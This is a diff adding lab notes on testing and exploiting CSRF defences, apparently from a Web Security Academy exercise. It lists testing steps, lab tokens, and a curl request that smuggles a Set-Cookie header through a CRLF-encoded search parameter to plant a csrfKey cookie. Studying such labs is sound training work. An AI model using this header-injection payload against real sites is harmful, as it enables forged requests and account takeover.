@@ -1,0 +1,34 @@
+
+In order for a CSRF attack to be possible:
+- A relevant action: change a users email
+- Cookie-based session handling: session cookie
+- No unpredictable request parameters 
+
+
+Testing CSRF Tokens:
+1. Remove the CSRF token and see if application accepts request
+2. Change the request method from POST to GET
+3. See if csrf token is tied to user session
+
+Testing CSRF Tokens and CSRF cookies:
+1. Check if the CSRF token is tied to the CSRF cookie
+   - Submit an invalid CSRF token
+   - Submit a valid CSRF token from another user
+2. Submit valid CSRF token and cookie from another user
+
+carlos:
+	csrf token: NJmVIdh9FL992nTNcUwwG8SbOHtypIZK
+	csrfKey cookie: IIZBfdtlX8pzOF7rfZmAMCpSZbGDKXMs
+
+In order to exploit this vulnerability, we need to perform 2 things:
+1. Inject a csrfKey cookie in the user's session (HTTP Header injection) - satisfied
+
+curl -i -s -k -X $'GET' \
+    -H $'Host: 0a01009703cbc90e80dd120c000c0084.web-security-academy.net' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: https://0a01009703cbc90e80dd120c000c0084.web-security-academy.net/' -H $'Upgrade-Insecure-Requests: 1' -H $'Sec-Fetch-Dest: document' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-User: ?1' -H $'Sec-Gpc: 1' -H $'Te: trailers' \
+    -b $'session=fQ02AGdnmAFkVLAZIWk5MghTD1nyQY8j; csrfKey=dh0Mubzso9EMD2y9GbItKYYG5RZheIrg' \
+    $'https://0a01009703cbc90e80dd120c000c0084.web-security-academy.net/?search=hat%0d%0aSet-Cookie:%20csrfKey=IIZBfdtlX8pzOF7rfZmAMCpSZbGDKXMs'
+
+2. Send a CSRF attack to the victim with a known csrf token
+
+
+
